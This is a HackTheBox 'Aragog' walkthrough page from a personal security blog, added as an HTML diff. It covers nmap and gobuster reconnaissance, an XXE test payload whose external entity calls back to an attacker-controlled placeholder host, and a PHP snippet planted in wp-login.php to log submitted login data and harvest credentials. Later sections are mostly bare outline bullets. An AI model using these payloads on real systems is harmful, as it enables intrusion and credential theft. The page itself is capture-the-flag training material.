@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" href="https://www.offsec.dev/favicon.png">
+        <meta name="image" property="og:image" content="https://www.offsec.dev/ogmedia.png">
+        <meta name="description" property="og:description" content="Security focused personal blog.">
+        <meta name="author" content="Kiril Stefanov">
+	<meta name="generator" content="Hugo 0.70.0" />
+	
+	<title>HackTheBox - Aragog Walkthrough - | Ethical Hacker | System Administrator | Penetration Tester | Bug Hunter |</title>
+	<title>CodePen - Long shadow</title>
+
+	
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
+	<link href="https://www.offsec.dev/css/bootstrap.min.css" rel="stylesheet">
+	<link href="https://www.offsec.dev/css/strange-case.css" rel="stylesheet">
+	<link rel="stylesheet" href="https://www.offsec.dev/css/style.css">
+	<link rel="stylesheet" href="https://www.offsec.dev/css/menu.css">
+	
+
+	
+	
+	<!--[if lt IE 9]>
+	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+	<![endif]-->
+
+	
+	<link href="" rel="alternate" type="application/rss+xml" title="Kiril&#39;s Security Blog" />
+</head>
+<body class="scheme-slate">
+	<canvas id="c"></canvas>
+
+
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-sm-4 col-md-3 col-lg-3 sidebar">
+
+			
+	<div class="sidebar-content">
+		
+		<a href="https://www.offsec.dev"><h1>Kiril&#39;s Security Blog</h1></a>
+		<p>| Ethical Hacker | System Administrator | Penetration Tester | Bug Hunter |</p>
+
+		
+		<div class="sidebar-freetext">
+			<p><a href="https://www.hackthebox.eu/profile/33863" target="_blank"><script src="https://www.hackthebox.eu/badge/33863"></script></a></p>
+			<p>Nothing Is Private ...</p>
+		</div>
+		
+		<div class="navbar-collapse" id="sidebar-menus">
+			<ul class="nav-item dropdown ml-100" style="list-style-type: none;">
+			  
+			  <li class="dropup">
+				
+				<a href="https://www.offsec.dev/">Nothing like 127.0.0.1</a>
+				
+			  </li>
+			  
+			  <li class="dropup">
+				
+				<a href="https://www.offsec.dev/posts/about/">About Me</a>
+				
+			  </li>
+			  
+			  <li class="dropup">
+				
+				  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Blog Posts <span class="caret"></span></a>
+				<ul class="dropdown-menu dropdown-menu-right" style="left: 166.05px;bottom: 3.4px; overflow: auto;">
+				  
+					<li><a href="https://www.offsec.dev/posts/ctf_post">Why CTF are awesome</a></li>
+				  
+					<li><a href="https://www.offsec.dev/posts/ansi_art/">Ansi Art</a></li>
+				  
+				</ul>
+				
+			  </li>
+			  
+			  <li class="dropup">
+				
+				  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Handy Resources <span class="caret"></span></a>
+				<ul class="dropdown-menu dropdown-menu-right" style="left: 166.05px;bottom: 3.4px; overflow: auto;">
+				  
+					<li><a href="https://www.offsec.dev/posts/enum/">Enumeration</a></li>
+				  
+					<li><a href="https://www.offsec.dev/posts/shells/">Reverse Shells</a></li>
+				  
+				</ul>
+				
+			  </li>
+			  
+			  <li class="dropup">
+				
+				  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">WriteUp section <span class="caret"></span></a>
+				<ul class="dropdown-menu dropdown-menu-right" style="left: 166.05px;bottom: 3.4px; overflow: auto;">
+				  
+					<li><a href="https://www.offsec.dev/posts/cache/">Access</a></li>
+				  
+					<li><a href="https://www.offsec.dev/posts/aragog">Aragog</a></li>
+				  
+					<li><a href="https://www.offsec.dev/posts/beep">Beep</a></li>
+				  
+					<li><a href="https://www.offsec.dev/posts/devel">Devel</a></li>
+				  
+					<li><a href="https://www.offsec.dev/posts/lame">Lame</a></li>
+				  
+				</ul>
+				
+			  </li>
+			  
+			</ul>
+		</div>
+
+		
+
+		
+
+		<p class="copyright">&copy; 2020. All rights reserved. </p>
+		<p class="attr">Powered by <a href="http://gohugo.io">Hugo</a> &amp; <a href="https://github.com/ExchangeRate-API/strange-case">Strange Case</a> (inspired by <a href="https://github.com/poole/hyde">Hyde</a>).</p>
+
+	</div>
+
+
+			</div>
+			<div class="col-sm-7 col-sm-offset-4 col-md-6 col-md-offset-3 col-lg-5 col-lg-offset-3 content">
+
+				<div class="post">
+
+					<div class="post-heading">
+						<h1>HackTheBox - Aragog Walkthrough</h1>
+						<span class="post-date"><a href="https://www.offsec.dev/posts/aragog/"># Jul 26, 2018</a></span>
+					</div>
+
+					<p><img src="https://monsterlegacy.files.wordpress.com/2017/02/aragogbeauty.jpg" alt="Aragog"></p>
+<h2 id="1-recon-and-information-gathering">1. Recon and Information gathering</h2>
+<p>Machine name: Aragog<br>
+IP: 10.10.10.78<br>
+OS: Linux</p>
+<h3 id="nmap">Nmap</h3>
+<p><code>nmap -A 10.10.10.78 -oN base.nmap</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.78
+Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">997</span> closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+|_-r--r--r--    <span style="color:#ae81ff">1</span> ftp      ftp            <span style="color:#ae81ff">86</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2017</span> test.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.8
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was <span style="color:#ae81ff">5</span>
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Thu Jul  5 14:34:23 2018 -- 1 IP address (1 host up) scanned in 12.46 seconds</span></code></pre></div>
+<h3 id="ssh">SSH</h3>
+<p>SSH is running on default port with no additional interesting information from the scan. On connecting we can see that it only takes ssh key authentication and doesn&rsquo;t accept passwords:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh root@10.10.10.78
+root@10.10.10.78: Permission denied <span style="color:#f92672">(</span>publickey<span style="color:#f92672">)</span>.</code></pre></div>
+<h3 id="ftp">FTP</h3>
+<p>Quick check on the version doesn&rsquo;t show any vulns available, but we have a file and anonymous access to that file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;details&gt;</span>
+    <span style="color:#f92672">&lt;subnet_mask&gt;</span>255.255.255.192<span style="color:#f92672">&lt;/subnet_mask&gt;</span>
+    <span style="color:#f92672">&lt;test&gt;&lt;/test&gt;</span>
+<span style="color:#f92672">&lt;/details&gt;</span></code></pre></div>
+<p>So far that&rsquo;s all we have/can do with the ftp so we continue with the exposed services.</p>
+<h3 id="http">HTTP</h3>
+<p>Fist let&rsquo;s see what is available at / on the webserver:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl 10.10.10.78 -s | grep title
+&lt;title&gt;Apache2 Ubuntu Default Page: It works&lt;/title&gt;</code></pre></div>
+<p>Nothing interesting, just the default webpage for Ubuntu&rsquo;s Apache installations. Next step - dirbusting. We&rsquo;ll start with a small list and some basic extensions - if we don&rsquo;t find anything interesting we can expand the search with bigger wordlist:</p>
+<p><code>gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.78 -t 50 -x txt,php,xml</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Gobuster v1.4.1              OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span>
+<span style="color:#f92672">=====================================================</span>
+<span style="color:#f92672">=====================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Mode         : dir
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url/Domain   : http://10.10.10.78/
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads      : <span style="color:#ae81ff">50</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist     : /usr/share/wordlists/dirb/common.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes : 200,204,301,302,307
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions   : .txt,.php,.xml
+<span style="color:#f92672">=====================================================</span>
+/hosts.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/index.html <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+---------------------------------------</code></pre></div>
+<p>Only one php file found with that list. The content:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://10.10.10.78/hosts.php
+
+There are <span style="color:#ae81ff">4294967294</span> possible hosts <span style="color:#66d9ef">for</span> </code></pre></div>
+<p>Looking at the output and seeing <code>4294967294</code> and <code>possible hosts</code> should lead our train of thought to ip4 addresses (at least did that for me):</p>
+<blockquote>
+<p>IPv4 uses 32-bit IP address, and with 32 bits the maximum number of IP addresses is 232—or 4,294,967,296.</p>
+</blockquote>
+<p>Adding one IP for broadcast and one for network results in the same number of hosts. Checking back our test.txt and seeing a network mask there should be our next pointer - let&rsquo;s use them together:</p>
+<p><code>curl -X POST http://10.10.10.78/hosts.php -d @text.txt</code></p>
+<p>Which calculates the possible hosts for the provided netmask:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl output</code></pre></div>
+<p>So we now know how to interact with the application. Since we have XML input our first check should be for possible XXE (XML External Entity)</p>
+<h2 id="2-vulnerability-testing">2. Vulnerability Testing</h2>
+<p>As a start let&rsquo;s run a python webserver on our attacking machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -m SimpleHTTPServer <span style="color:#ae81ff">80</span>
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> ...</code></pre></div>
+<p>And let&rsquo;s create a file with our payload for testing the app - we&rsquo;ll call it <code>xxe_test.xml</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
+<span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;http://OUR.ATTACK.MACHINE.IP&#34; &gt;</span>]&gt;
+<span style="color:#f92672">&lt;details&gt;</span>
+    <span style="color:#f92672">&lt;subnet_mask&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/subnet_mask&gt;</span>
+    <span style="color:#f92672">&lt;test&gt;&lt;/test&gt;</span>
+<span style="color:#f92672">&lt;/details&gt;</span></code></pre></div>
+<p>Send it to the webapp via curl request:</p>
+<p><code>curl http://10.10.10.78/hosts.php -X POST -d @xxe_test.txt</code></p>
+<p>check our python server and see if we have a callback:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">There are <span style="color:#ae81ff">4294967294</span> possible hosts <span style="color:#66d9ef">for</span> 
+
+10.10.10.78 - - <span style="color:#f92672">[</span>29/Jul/2018 03:07:19<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.0&#34;</span> <span style="color:#ae81ff">200</span> -</code></pre></div>
+<p>Bingo! We have a way of executing things on the remove machine. Let&rsquo;s see what exactly is available to us.</p>
+<ul>
+<li>XXE testing</li>
+<li>XXE fixes/avoidance</li>
+</ul>
+<h2 id="3-exploitation">3. Exploitation</h2>
+<ul>
+<li>XXE exploitation</li>
+<li>Gaining user access</li>
+</ul>
+<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+<ul>
+<li>Internal enumeration</li>
+<li>Wordpress</li>
+<li>Permissions</li>
+<li>Getting admin credentials through logging Wordpress login form</li>
+<li>r00tz</li>
+</ul>
+<p>Edit wp-login.php:</p>
+<p><code>vim /home/myserverlab/public_html/logger/wp-login.php</code></p>
+<p>Output:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+$entityBody <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;php://input&#39;</span>);
+<span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;admin.logger&#39;</span>, $entityBody <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</code></pre></div>
+
+
+				</div>
+
+			</div>
+			<div class="col-sm-1 col-md-3 col-md-4">
+			</div>
+		</div>
+	</div>
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-166758470-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+<script  src="https://www.offsec.dev/js/canvas.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+
+<script src="https://www.offsec.dev/js/bootstrap.min.js"></script>
+<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="offsec" data-description="If you like this content" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FF813F" data-position="right" data-x_margin="10" data-y_margin="10"></script>
+</body>
+</html>
+
